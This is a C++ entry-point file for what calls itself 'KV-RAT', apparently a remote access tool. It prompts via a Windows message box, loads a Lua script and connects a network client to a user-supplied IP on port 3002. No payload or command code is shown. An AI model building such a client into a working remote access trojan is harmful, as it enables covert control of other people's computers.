#include <iostream>
#include "Networking/Networking.h"
#include "Commands/Commands.h"
#include "Commands/CommandHandler.h"
#include <../../external/SDL2/SDL.h>
#include <../../external/SDL2/SDL_image.h>
#include <../../external/SDL2/SDL_mixer.h>
#include "Commands/LuaBackend.h"
#include <cstring>

int main(int argc, char** argv)
{
    if (argc < 2)
    {
        std::cerr << "Usage: " << argv[0] << " [IP]\n";
        return 1;
    }

    int result = MessageBoxW(nullptr, L"KV-RAT has started, but nothing has initalized.\nContinue?", L"KV-RAT", MB_OKCANCEL | MB_ICONEXCLAMATION);
    if (result == 2)
    {
        return 0;
    }

    if(strcmp(argv[1], "-l") == 0)
    {
        LuaBackend lb("script.lua");
    }
    else
    {
        LuaBackend lb("script.lua");
        Network client(argv[1], 3002);
        client.start();
    }
    
    return 0;
}